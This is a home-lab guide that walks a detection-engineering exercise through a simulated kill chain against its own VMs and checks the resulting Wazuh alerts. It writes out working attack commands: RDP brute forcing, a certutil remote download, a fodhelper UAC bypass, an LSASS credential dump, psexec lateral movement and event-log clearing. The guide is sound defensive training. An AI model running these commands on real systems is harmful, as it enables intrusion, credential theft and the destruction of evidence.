# Adversary Simulation & Attack Execution

> [!CAUTION]
> **Safety Disclaimer**
> The commands detailed below contain actual adversary techniques, including malware execution and brute forcing. **Ensure you are executing these commands ONLY within your isolated Host-Only VirtualBox network.** Never run these tools against systems you do not own or have explicit permission to test.

## Pre-Attack Checklist
* [ ] Verify all VMs are powered on and communicating (ping tests).
* [ ] Check Wazuh Dashboard to ensure both the Windows and Linux agents are `Active`.
* [ ] Verify Suricata logs are being ingested into Wazuh.
* [ ] **Take snapshots of all VMs in their current clean state.**

---

## The Attack Kill Chain Walkthrough

We will simulate a complete adversary kill chain, moving from reconnaissance to lateral movement. Execute the following commands in order.

### 1. Reconnaissance
From the **Kali Attacker (192.168.56.50)**, perform an aggressive Nmap scan against the Windows Target.
```bash
nmap -sS -sV -A -T4 192.168.56.20
```
*Expected Result:* Suricata will detect the network scanning behavior, and Wazuh will log the event.

### 2. Initial Access (Brute Force)
Simulate an RDP brute-force attack to gain initial access using Hydra.
```bash
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.56.20 -t 4 -V
```
*Expected Result:* Windows Security Event ID 4625 (Logon Failure) will flood the logs, triggering our Brute Force detection rule.

### 3. Execution (Malicious Payloads)
Log into the **Windows Target (192.168.56.20)**. We will simulate malware dropping and execution.

Simulate downloading an external payload using `certutil` (T1105):
```cmd
certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1105/T1105.md" temp.txt
```

Simulate encoded PowerShell execution (T1059.001):
```powershell
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand "VwByAGkAdABlAC0ASABvAHMAdAAgACIASABlAGwAbABvACwAIABNAGEAbAB3AGEAcgBlACEAIgA="
```
*(The encoded string decodes to `Write-Host "Hello, Malware!"`)*

### 4. Persistence
Establish persistence so the attacker maintains access across reboots.

Create a malicious Scheduled Task (T1053.005):
```cmd
schtasks /create /tn "UpdaterService" /tr "cmd.exe /c echo beacon > C:\updater.log" /sc daily /st 09:00
```

Add a malicious Registry Run Key (T1547.001):
```cmd
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousPayload" /t REG_SZ /d "C:\Windows\System32\calc.exe" /f
```

### 5. Privilege Escalation
Simulate bypassing User Access Control (UAC) via the `fodhelper.exe` registry modification technique (T1548.002).
```powershell
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "cmd.exe /c start" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
```
*Note: Run `Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force` afterwards to clean up.*

### 6. Credential Access
Simulate dumping LSASS (Local Security Authority Subsystem Service) memory to harvest credentials (T1003.001).
Open an administrative command prompt and use the built-in `comsvcs.dll` mini-dump function:
```cmd
tasklist /fi "imagename eq lsass.exe"
# Note the PID, e.g., 684
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 684 C:\lsass.dmp full
```

### 7. Lateral Movement
From the **Kali Attacker**, use Impacket to laterally move from the Windows system to the Linux target (T1021.002), assuming credentials were stolen.
```bash
impacket-psexec administrator@192.168.56.20
```

### 8. Defense Evasion
Finally, simulate the attacker covering their tracks by clearing the Windows Security Event Log (T1070.001).
```cmd
wevtutil cl security
wevtutil cl system
```

---

## Post-Attack Verification & Evidence Collection
Navigate to the Wazuh Dashboard -> **Security Events**.

1. Verify that all 10 custom detection rules triggered appropriately during the execution phase.
2. Review the detailed JSON logs for each event to understand the telemetry collected (e.g., Sysmon Event ID 1 for command-line arguments, Event ID 4104 for PowerShell script blocks).
3. **Portfolio Guidance:** Take screenshots of the Wazuh Dashboard showing the triggered alerts mapped to the MITRE ATT&CK framework. Include these screenshots in your project write-up or presentation.
